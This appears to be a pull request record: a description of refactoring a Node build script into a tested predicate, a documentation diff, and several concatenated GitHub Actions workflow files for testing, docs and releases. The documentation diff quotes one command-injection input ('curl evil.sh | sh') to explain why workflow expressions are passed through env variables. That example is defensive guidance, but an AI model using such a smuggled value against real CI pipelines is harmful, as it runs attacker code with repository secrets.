result.title: fix: extract build.ts's decision into a pure, tested predicate
result.body:
## Summary

`packages/node/scripts/build.ts` did all its work at module scope — reading `TARGET`, branching,
shelling out to `tsc` at import time — so nothing could import it without triggering a build, and
it carried no colocated test.

The whole decision is one predicate: `target` empty/`main`/`noarch` builds the JS shim; a
per-triple row means the engine already staged the binary, so the script exits early. That
predicate now lives in `packages/node/scripts/build-decision.ts` as `shouldBuildShim`, pure and
importable, with a colocated test at `packages/node/scripts/build-decision.test.ts`. `build.ts` is
now a thin composition root: it reads `TARGET`, calls `shouldBuildShim`, and does only I/O — no
decision of its own.

`build.ts` is build tooling under `packages/node/scripts/`, not shipped source, so this sits
outside the red/green cadence (AGENTS.md) and I did not extend `dogfood.yml`'s `packages/node/src`
scope for `colocated-test` / `unit-lint` — that's a separate concern.

**Known gap, reported rather than fixed here:** `vite.config.ts`'s `test.include` (inherited from
`vitestConfig` in `src/vitest-config.ts`) is `src/**/*.test.ts`, so `pnpm test` does not currently
pick up `build-decision.test.ts`. I verified this by running `pnpm exec vitest run
--reporter=verbose` — only the 8 files under `src/` ran. Per instructions I did not widen the
vitest config or the dogfood scope to cover it; that's a call for a follow-up.

Observable behavior of `build.ts` is unchanged — verified locally with `TARGET=` (builds the shim)
and `TARGET=x86_64-unknown-linux-gnu` (exits early with the same message, unchanged).

## Test plan

- [x] `pnpm run lint` in `packages/node` — clean
- [x] `pnpm run typecheck` in `packages/node` — clean
- [x] `pnpm test` in `packages/node` — 8 files / 28 tests pass (does not yet include the new
      `scripts/` test — see gap noted above)
- [x] `TARGET= pnpm exec tsx scripts/build.ts` — builds the shim, exits 0
- [x] `TARGET=x86_64-unknown-linux-gnu pnpm exec tsx scripts/build.ts` — exits early, same message
- [x] `pnpm run build` in `docs` — site still builds

@@ -283,9 +283,28 @@ Two reasons this is a requirement, not a preference:
   extracting to a script sidesteps the whole class (#301, #302).
 
 Follow the `internals/move-major-tag` (`src/move_major_tag.py` + colocated unit test + `tests/`)
-and `check_e2e_verify_wired` precedents for structure. Passing a value from a step to a script is
-a CLI argument (`… check.py "${{ steps.detect.outputs.package_root }}"`), never an env
-side-channel — see **Never pass data through the environment**.
+and `check_e2e_verify_wired` precedents for structure.
+
+**A value a step hands a script arrives as a CLI argument, never read from the environment by the
+script itself.** Never inline `${{ }}` into the invocation: GitHub substitutes that text before bash
+parses it, so a `workflow_dispatch` input of `a"; curl evil.sh | sh; "` executes. Bind the
+expression to a step `env:` name, then pass that as a quoted shell variable in the argument list:
+
+```yaml
+env:
+  PACKAGES: ${{ inputs.packages }}
+run: pnpm run bootstrap-npm -- "$PACKAGES"
+```
+
+That `env:` name is bash's, not the script's. It exists only to carry the value across the templating
+layer, and bash expands it after parsing, as one argv element. The script reads `process.argv` /
+`sys.argv` and never `process.env` / `os.environ` for its own inputs — that read is the side-channel
+**Never pass data through the environment** forbids, and a step `env:` block is not an exemption
+from it.
+
+The exception is a variable some *other* tool reads from the environment as its own documented
+interface: `NODE_AUTH_TOKEN` for `npm publish`, `CI`, `PATH`. Those are that tool's contract, not our
+step-to-script wiring, and they stay in `env:`.
 
 ## Wiring gates are earned

name: Bootstrap npm packages (one-shot)

# One-shot helper to publish 0.0.0-bootstrap stubs for new npm package names, so trusted
# publishing has an existing package to bind to. See docs/internals/repo.md, "Bootstrapping
# a new npm package name".

on:
  workflow_dispatch:
    inputs:
      packages:
        description: 'Comma-separated list of npm package names to bootstrap'
        required: true

jobs:
  bootstrap:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-node@v6
        with:
          node-version: '24'
          registry-url: 'https://registry.npmjs.org'
      - name: Publish bootstrap stubs
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
          PACKAGES: ${{ inputs.packages }}
        run: |
          set -euo pipefail
          IFS=',' read -ra PKGS <<< "$PACKAGES"
          for name in "${PKGS[@]}"; do
            name="${name// /}"
            echo "::group::publish 0.0.0-bootstrap for $name"
            dir=$(mktemp -d)
            pushd "$dir" > /dev/null
            cat > package.json <<EOF
          {
            "name": "$name",
            "version": "0.0.0-bootstrap",
            "description": "Bootstrap stub; replaced on first real publish via OIDC trusted publisher.",
            "license": "MIT",
            "repository": {
              "type": "git",
              "url": "git+https://github.com/thekevinscott/testing-conventions.git"
            }
          }
          EOF
            # npm refuses to publish a prerelease as `latest`, so the stub is tagged explicitly and the
            # real 0.0.1 publish becomes `latest`.
            npm publish --access public --tag bootstrap
            popd > /dev/null
            rm -rf "$dir"
            echo "::endgroup::"
          done

name: Check

# Runs `putitoutthere check` on every PR, so a release misconfiguration — a manifest
# repository-URL mismatch, bundle_cli wiring, a tag-template collision — fails here rather
# than mid-release.

on:
  pull_request:
  workflow_dispatch:

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  check:
    name: putitoutthere check
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: thekevinscott/putitoutthere@v0
        with:
          command: check

name: Checks package (tests)

# Red/green tests for internals/checks. See docs/internals/repo.md, "The self-test
# assertions package".

on:
  pull_request:
  workflow_dispatch:

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  test:
    name: tc-checks — unit + e2e
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: astral-sh/setup-uv@v7
      - uses: actions/setup-python@v6
        with:
          python-version: '3.12'
      - name: Unit + e2e tests
        # The e2e tier reads this repo's workflow YAML and manifests, so a `paths:` filter
        # would skip the runs that break it.
        working-directory: internals/checks
        run: uv run pytest -v --import-mode=importlib

name: Docs

on:
  push:
    branches: [main]
    paths:
      - 'docs/**'
      - '.github/workflows/docs.yml'
  pull_request:
    paths:
      - 'docs/**'
      - '.github/workflows/docs.yml'
  workflow_dispatch:

permissions:
  contents: read
  pages: write
  id-token: write

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  # Scope cancellation to PR pushes so the `push: [main]` run — the one that deploys Pages —
  # is never cancelled out from under itself.
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  build:
    name: Build
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: docs
    steps:
      - uses: actions/checkout@v6
      - uses: pnpm/action-setup@v5
        with:
          version: ">=11"
      - uses: actions/setup-node@v6
        with:
          node-version: 24
      - run: pnpm install --no-frozen-lockfile
      - run: pnpm run build
      - uses: actions/upload-pages-artifact@v5
        with:
          path: docs/.vitepress/dist

  deploy:
    name: Deploy
    needs: build
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    steps:
      - id: deployment
        uses: actions/deploy-pages@v5

name: Dogfood

# testing-conventions enforcing its own conventions on its own packages, by consuming the
# shipped reusable workflow. See docs/internals/repo.md, "Self-test and the `@v0` path".

on:
  pull_request:
    paths:
      - 'packages/node/**'
      - 'packages/python/**'
      - 'internals/checks/**'
      - 'internals/move-major-tag/**'
      - 'internals/detect/**'
      - '.github/workflows/dogfood.yml'
      - '.github/workflows/testing-conventions.yml'
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      version:
        description: 'testing-conventions version to verify against, e.g. 0.0.67. Empty (the default, on pull_request / push) runs the hermetic build-from-HEAD path. The verify-and-promote workflow dispatches this at the release SHA with the just-published version pinned, forcing the published consumer path.'
        type: string
        default: ''

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  # Scope cancellation to PR pushes so the `push: [main]` run is never cancelled out from
  # under itself.
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  build-cli:
    name: Build the CLI from HEAD (hermetic)
    # The hermetic CLI is built here, in a repo-only caller: a guarded job in the reusable
    # workflow would render a skipped row in every consumer's checks UI. One build per run —
    # the artifact is run-scoped and every `uses:` call shares it via `needs: [build-cli]`.
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: ./.github/actions/build-hermetic-cli

  conventions:
    name: Shipped reusable workflow over the Python plugin source
    needs: [build-cli]
    uses: ./.github/workflows/testing-conventions.yml
    with:
      version: ${{ inputs.version }}
      source: packages/python/python

  colocated-test:
    name: Colocated test (packages/node/src)
    needs: [build-cli]
    uses: ./.github/workflows/testing-conventions.yml
    with:
      version: ${{ inputs.version }}
      source: packages/node/src
      gates: '["colocated-test"]'

  unit-lint:
    name: Unit lint (packages/node/src)
    needs: [build-cli]
    uses: ./.github/workflows/testing-conventions.yml
    with:
      version: ${{ inputs.version }}
      source: packages/node/src
      gates: '["unit-lint"]'

  e2e-verify:
    name: E2E attestation (packages/node)
    needs: [build-cli]
    uses: ./.github/workflows/testing-conventions.yml
    with:
      version: ${{ inputs.version }}
      source: packages/node
      gates: '["e2e-verify"]'

  checks:
    name: Shipped reusable workflow over the self-test checks package
    # `source` is the inner importable-package dir, so the unit-tier gates recurse it while the
    # suite tiers derive from the package root (internals/checks, where the pyproject lives).
    needs: [build-cli]
    uses: ./.github/workflows/testing-conventions.yml
    with:
      version: ${{ inputs.version }}
      source: internals/checks/src

  move-major-tag:
    name: Shipped reusable workflow over the move-major-tag helper
    # `source` is the inner module dir, so the unit-tier gates recurse it while the suite tiers
    # derive from the package root (internals/move-major-tag, where the pyproject lives).
    needs: [build-cli]
    uses: ./.github/workflows/testing-conventions.yml
    with:
      version: ${{ inputs.version }}
      source: internals/move-major-tag/src

  detect:
    name: Shipped reusable workflow over the detect action's package
    needs: [build-cli]
    uses: ./.github/workflows/testing-conventions.yml
    with:
      version: ${{ inputs.version }}
      source: internals/detect/src

name: Testing Conventions

# Reusable, consumer-facing workflow: one `uses:` call runs every check.
# See docs/reference/workflow.md for the inputs, the checks, and the `@v0` contract.

on:
  workflow_call:
    inputs:
      languages:
        description: 'Optional JSON array restricting which languages to check, e.g. ["python"]. Empty (the default) auto-detects every supported language present under `source`.'
        type: string
        default: ''
      source:
        description: 'Directory scanned recursively for sources.'
        type: string
        default: 'src'
      version:
        description: 'testing-conventions version to run, e.g. 0.1.0 (default: latest from npm).'
        type: string
        default: ''
      config:
        description: 'Optional config file to refine the checks (coverage thresholds, exemptions). If absent, every check runs with sane defaults.'
        type: string
        default: 'testing-conventions.toml'
      base:
        description: 'Base ref for the diff-scoped `--base` jobs, diffed as `<base>...HEAD`. Used by the `*-changed` jobs, which run on `pull_request` only and check out full history.'
        type: string
        default: 'origin/main'
      run_e2e:
        description: 'Force the `e2e verify` freshness gate on. It is already default-on when committed receipts (`e2e-attestations/`) are present at the package root; set this to run it regardless. Needs the receipts and full git history.'
        type: boolean
        default: false
      packaging_artifact:
        description: 'Name of an uploaded build artifact (actions/upload-artifact) holding the built distributions (.whl/.tar.gz/.tgz/.crate) to check. When set, the packaging job downloads and inspects it. When empty (default), packaging still runs over a conventional dist/ found in the checkout, and is skipped only when no dist/ exists either.'
        type: string
        default: ''
      gates:
        description: 'Optional JSON array naming which gates run, e.g. ["colocated-test", "unit-lint", "integration-lint"]. Empty (the default) runs every applicable gate. Gate names: colocated-test, one-function-per-file, unit-lint, unit-coverage, mutation, integration-lint, packaging, e2e-verify, changelog. A named gate still applies its own conditions, and its diff-scoped variant rides with it (colocated-test covers the co-change job, unit-coverage the changed-line job). The allowlist is authoritative: a gate left out is skipped even when run_e2e / packaging_artifact is set.'
        type: string
        default: ''
      rust_toolchain:
        description: 'Manual override: provision a stable Rust toolchain (with a cargo registry + target cache) in the suite-executing jobs, before build_command runs. unit coverage / changed-line coverage / unit mutation already auto-provision it when the manifest at the derived package root declares a Rust-compiling build (a Cargo.toml, a maturin backend, a napi key); set this by hand only for a build the manifest does not express. The rust matrix arm always carries its own toolchain. false (the default) leaves provisioning to that auto-derivation.'

      coverage_languages: ${{ steps.scan_hermetic.outputs.coverage_languages || steps.scan_published.outputs.coverage_languages }}
      mutation_languages: ${{ steps.scan_hermetic.outputs.mutation_languages || steps.scan_published.outputs.mutation_languages }}
      packaging_dist: ${{ steps.scan_hermetic.outputs.packaging_dist || steps.scan_published.outputs.packaging_dist }}
      e2e_attestation: ${{ steps.scan_hermetic.outputs.e2e_attestation || steps.scan_published.outputs.e2e_attestation }}

        run: |
          set -euo pipefail
          if [ "$PM" = "pnpm" ]; then pnpm install --frozen-lockfile; else npm ci; fi
      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_build != '' && needs.detect.outputs.build_command != '' }}
        name: Run the build step (build_command)
        working-directory: ${{ needs.detect.outputs.package_root }}
        env:
          BUILD_COMMAND: ${{ needs.detect.outputs.build_command }}
        run: |
          set -euo pipefail
          eval "$BUILD_COMMAND"
      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_build != '' }}
        name: Build the distribution (packaging_build)
        working-directory: ${{ needs.detect.outputs.package_root }}
        env:
          PACKAGING_BUILD: ${{ needs.detect.outputs.packaging_build }}
        run: |
          set -euo pipefail
          eval "$PACKAGING_BUILD"
      - name: Check the built distributions ship no test files
        env:
          VERSION: ${{ inputs.version }}
          PACKAGING_ARTIFACT: ${{ inputs.packaging_artifact }}
          PACKAGE_ROOT: ${{ needs.detect.outputs.package_root }}
          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}
        run: |
          set -euo pipefail
          # nullglob: an unmatched glob expands to nothing, not the literal; globstar: `**` recurses.
          shopt -s nullglob globstar
          pkg="${PACKAGE_ROOT:-.}"
          if [ -n "$PACKAGING_ARTIFACT" ]; then dist_root=_packaging_artifact; crate_root=_packaging_artifact; else dist_root="$pkg/dist"; crate_root="$pkg/target/package"; fi
          checked=0
          check () {
            local lang="$1"; shift
            for dist in "$@"; do
              echo "::group::packaging --language $lang $dist"
              ${CLI_COMMAND:-npm --prefix "$RUNNER_TEMP" exec --yes -- "testing-conventions${VERSION:+@$VERSION}"} packaging "$dist" --language "$lang"
              echo "::endgroup::"
              checked=$((checked + 1))
            done
          }
          check python "$dist_root"/**/*.whl "$dist_root"/**/*.tar.gz
          check typescript "$dist_root"/**/*.tgz
          check rust "$crate_root"/**/*.crate
          if [ "$checked" -eq 0 ]; then
            echo "::error::no recognized built distribution (.whl / .tar.gz / .tgz / .crate) found in '$dist_root' or '$crate_root'"
            exit 1
          fi
          echo "checked $checked built distribution(s); no test files shipped"

name: Move major tag

# Verify a release, then advance the moving major tag `@v0` to it. See
# docs/internals/repo.md, "Rolling release: how `@v0` advances".

on:
  workflow_run:
    workflows: [Release]
    types: [completed]

permissions: {}

# Newest release wins; a stale in-flight verify+move is cancelled before it can race the tag push.
concurrency:
  group: move-major-tag
  cancel-in-progress: true

jobs:
  context:
    if: >-
      github.event.workflow_run.conclusion == 'success' &&
      github.event.workflow_run.head_branch == 'main'
    runs-on: ubuntu-latest
    permissions:
      contents: read
    outputs:
      sha: ${{ github.event.workflow_run.head_sha }}
      version: ${{ steps.version.outputs.version }}
    steps:
      - uses: actions/checkout@v6
        with:
          # A workflow_run checkout defaults to the default-branch HEAD, so the release commit is
          # named explicitly; full history and tags let the helper resolve the published version and
          # the `v0` ancestry.
          ref: ${{ github.event.workflow_run.head_sha }}
          fetch-depth: 0
          fetch-tags: true
      - uses: astral-sh/setup-uv@v7
      - name: Resolve the just-published version to pin the verification to
        id: version
        run: echo "version=$(uv run --project internals/checks tc-checks verify-release resolve-version "${{ github.event.workflow_run.head_sha }}")" >> "$GITHUB_OUTPUT"

  verify-layout:
    # The remote-action-fetch provenance the version-pinned suite cannot cover: it runs
    # detect@v0, the old tag.
    needs: context
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v6
        with:
          ref: ${{ needs.context.outputs.sha }}
          fetch-depth: 0
      - uses: astral-sh/setup-uv@v7
      - name: The release archive carries the detect action's fetch targets
        run: uv run --project internals/checks tc-checks verify-release check-layout "${{ needs.context.outputs.sha }}"

  verify-suite:
    # `workflow_dispatch` takes a branch or tag ref, never a bare SHA, so verification runs at a
    # throwaway tag on the release commit.
    needs: context
    runs-on: ubuntu-latest
    permissions:
      contents: write
      actions: write
    steps:
      - uses: actions/checkout@v6
        with:
          ref: ${{ needs.context.outputs.sha }}
          fetch-depth: 0
          fetch-tags: true
      - uses: astral-sh/setup-uv@v7
      - name: Verify the version-pinned self-test + dogfood suites at the release commit
        env:
          GH_TOKEN: ${{ github.token }}
        run: >-
          uv run --project internals/checks tc-checks verify-release dispatch-and-wait
          "${{ needs.context.outputs.sha }}" "${{ needs.context.outputs.version }}"
          testing-conventions-selftest.yml dogfood.yml

  move-v0:
    needs: [context, verify-layout, verify-suite]
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v6
        with:
          ref: ${{ needs.context.outputs.sha }}
          fetch-depth: 0
          fetch-tags: true
      - name: Advance @v0 (forward-only) to the verified release commit
        env:
          SHA: ${{ needs.context.outputs.sha }}
          TAG: v0
        run: python3 internals/move-major-tag/src/move_major_tag.py

jobs:
  build-wheel:
    name: Build wheel (once)
    # The maturin `bindings = "bin"` wheel ships the Rust binary with no per-version native
    # extension, so one interpreter-agnostic `py3-none` build feeds every matrix leg below.
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: dtolnay/rust-toolchain@stable

        run: uv build --wheel -o dist
        working-directory: packages/python
      - uses: actions/upload-artifact@v7
        with:
          name: python-wheel
          path: packages/python/dist/*.whl

  build:
    name: Install + smoke (py${{ matrix.python-version }})
    needs: build-wheel
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        python-version: ['3.9', '3.10', '3.11', '3.12', '3.13']
    steps:
      - uses: actions/download-artifact@v8
        with:
          name: python-wheel
          path: dist
      - uses: actions/setup-python@v6
        with:
          python-version: ${{ matrix.python-version }}
      - name: Install wheel + smoke (--version)
        run: |
          python -m venv .venv
          .venv/bin/pip install dist/*.whl
          .venv/bin/testing-conventions --version

  plugin:
    name: Pytest plugin (py${{ matrix.python-version }})
    needs: build-wheel
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      # 3.9 exercises the tomli fallback; 3.13 the stdlib tomllib path.
      matrix:
        python-version: ['3.9', '3.13']
    defaults:
      run:
        working-directory: packages/python
    steps:
      - uses: actions/checkout@v6
      - uses: actions/download-artifact@v8
        with:
          name: python-wheel
          path: packages/python/dist
      - uses: actions/setup-python@v6
        with:
          python-version: ${{ matrix.python-version }}
      # Installing the built wheel registers the pytest11 entry point, so the integration tests
      # load the plugin the way a consumer's install does.
      - name: Install the wheel with the test toolchain
        run: pip install dist/*.whl pytest pytest-cov coverage
      - name: Run the plugin integration tests
        run: pytest tests/ -q

name: Release

on:
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      release_packages:
        description: >-
          Manual-release override forwarded to putitoutthere, bypassing change
          detection and publishing exactly the named packages. Comma-separated
          `name[@<bump|version>]`, e.g.
          `testing-conventions-rust@0.0.2,testing-conventions-py@0.0.2,testing-conventions-npm@0.0.2`.
          Empty = normal change-detected release.
        required: false
        default: ''

# cancel-in-progress is false here: see docs/internals/repo.md, "Release concurrency".
concurrency:
  group: release-${{ github.repository }}
  cancel-in-progress: false

jobs:
  preflight:
    runs-on: ubuntu-latest
    steps:
      - name: Repo visibility check
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          private=$(gh api "repos/${GITHUB_REPOSITORY}" --jq .private)
          if [ "$private" = "true" ]; then
            echo "::error::Repository is private. Trusted Publishing on npm / PyPI / crates.io requires a public repository so the provider can inspect the workflow file at the configured ref. Make the repo public (Settings -> General -> Danger Zone -> Change visibility) before releasing, or remove this preflight step if you have an alternative publish path."
            exit 1
          fi
          echo "Repo is public; OK to proceed."

  release:
    needs: preflight
    uses: thekevinscott/putitoutthere/.github/workflows/release.yml@v0
    permissions:
      contents: write
      id-token: write
    with:
      release_packages: ${{ inputs.release_packages }}
    # No `secrets:` block: the reusable workflow gates its crates.io and npm OIDC exchanges
    # on the caller's token being empty, so forwarding a secret here selects the classic
    # long-lived-token path. See docs/internals/repo.md, "Release credentials".

  # PyPI Trusted Publishers reject an OIDC token minted from a cross-repo reusable workflow, so
  # the upload runs here, in the caller's context. See docs/internals/repo.md, "The delegated
  # PyPI upload".
  pypi-publish:
    needs: release
    if: ${{ !cancelled() && needs.release.outputs.pypi_pending == 'true' }}
    runs-on: ubuntu-latest
    environment: release
    permissions:
      id-token: write
    steps:
      # `merge-multiple: true` points the matrix's byte-identical py3-none wheels at one path and
      # the parallel extraction races — a torn write, then twine `BadZipFile: Bad magic number`.
      # Stage each artifact separately, then copy one copy of each distribution into dist/.
      - name: Download sdist + wheel artifacts (no merge)
        uses: actions/download-artifact@v8
        with:
          pattern: '*-sdist'
          path: staging/
      - uses: actions/download-artifact@v8
        with:
          pattern: '*-wheel-*'
          path: staging/
      - name: Collect one copy of each distribution into dist/
        run: |
          set -euo pipefail
          mkdir -p dist
          find staging -type f \( -name '*.whl' -o -name '*.tar.gz' \) | while read -r f; do
            dest="dist/$(basename "$f")"
            if [ -e "$dest" ]; then
              echo "skip duplicate: $f"
            else
              cp "$f" "$dest"
            fi
          done
          echo "dist/ contents:"; ls -l dist/
      - uses: pypa/gh-action-pypi-publish@release/v1

  # The release job leaves a delegated PyPI package untagged, so its tag follows the upload.
  pypi-tag:
    needs: pypi-publish
    uses: thekevinscott/putitoutthere/.github/workflows/pypi-tag.yml@v0
    permissions:
      contents: write

name: Rust

on:

      - 'packages/rust/**'
      # The TypeScript mutation rule drives the bundled Node adapter, exercised by this suite.
      - 'packages/node/**'
      - '.github/workflows/rust.yml'
      # The Build job guards the reusable workflow against CLI subcommand drift.
      - '.github/workflows/testing-conventions.yml'

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  lint:
    name: Lint (fmt + clippy)
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: packages/rust
    steps:
      - uses: actions/checkout@v6
      - uses: dtolnay/rust-toolchain@stable
        with:
          components: clippy, rustfmt
      - uses: Swatinem/rust-cache@v2
        with:
          workspaces: packages/rust
      - run: cargo fmt --all -- --check
      - run: cargo clippy --all-targets -- -D warnings

  unit:
    name: Unit tests
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: packages/rust
    steps:
      - uses: actions/checkout@v6
      - uses: dtolnay/rust-toolchain@stable
      - uses: Swatinem/rust-cache@v2
        with:
          workspaces: packages/rust
      # The library target's inline `#[cfg(test)]` units only, so a red here points at a unit test
      # rather than at the `tests/` suites the job below runs.
      - run: cargo test --lib

  integration:
    name: Integration + e2e tests + coverage (100%)
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: packages/rust
    steps:
      - uses: actions/checkout@v6
      - uses: dtolnay/rust-toolchain@stable
        with:
          components: llvm-tools-preview
      - uses: Swatinem/rust-cache@v2
        with:
          workspaces: packages/rust
      # The coverage and Python-mutation suites shell out to coverage.py and the cosmic-ray
      # adapter: the engines come from internals/checks's pinned venv, and PYTHONPATH resolves the
      # adapter from source.
      - uses: actions/setup-python@v6
        with:
          python-version: '3.12'
      - uses: astral-sh/setup-uv@v7
      - name: Put the pinned Python engines on PATH
        working-directory: internals/checks
        run: |
          uv sync
          echo "$PWD/.venv/bin" >> "$GITHUB_PATH"
      # The TypeScript coverage suite shells out to vitest, so install the fixtures' toolchain.
      - uses: actions/setup-node@v6
        with:
          node-version: '24'
      - name: Install the TypeScript coverage fixtures' toolchain
        working-directory: packages/rust/tests/fixtures/unit_coverage/typescript
        run: npm ci
      - uses: taiki-e/install-action@cargo-llvm-cov
      - uses: taiki-e/install-action@nextest
      # The Rust mutation rule installs cargo-mutants itself on first use; caching that dir skips
      # the from-source compile.
      - name: Cache the provisioned cargo-mutants
        uses: actions/cache@v4
        with:
          path: ~/.cache/testing-conventions
          key: cargo-mutants-provision-${{ runner.os }}
      # The TypeScript mutation rule drives the bundled Node adapter, so build it and install its
      # deps; the tests inject its path via TESTING_CONVENTIONS_TS_MUTATION_ADAPTER.
      - uses: pnpm/action-setup@v5
        with:
          version: ">=11"
      - name: Build the TypeScript mutation adapter
        working-directory: packages/node
        run: |
          pnpm install --no-frozen-lockfile
          pnpm run build
      # The fixture projects install only vitest, their own runner; Stryker comes from the adapter
      # built above.
      - name: Install the TypeScript mutation fixtures' toolchain
        working-directory: packages/rust/tests/fixtures/unit_mutation/typescript
        run: npm ci
      # nextest runs each integration-test binary in its own process in parallel; the suites shell
      # out to real subprocesses, so wall clock is dominated by those, not by compile time.
      # PYTHONPATH points the Python mutation adapter at the source package.
      - run: cargo llvm-cov nextest --fail-under-lines 100
        env:
          PYTHONPATH: ${{ github.workspace }}/packages/python/python

  build:
    name: Build + smoke
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: packages/rust
    steps:
      - uses: actions/checkout@v6
      - uses: dtolnay/rust-toolchain@stable
      - uses: Swatinem/rust-cache@v2
        with:
          workspaces: packages/rust
      - run: cargo build --release
      - name: Smoke (--version)
        run: ./target/release/testing-conventions --version
      # Every `testing-conventions` invocation in the reusable workflow must name a subcommand the
      # just-built binary still exposes, so a rename cannot strand consumers pinned to `@v0`.
      - name: Guard the reusable workflow against subcommand drift
        run: ./target/release/testing-conventions workflow ../../.github/workflows/testing-conventions.yml
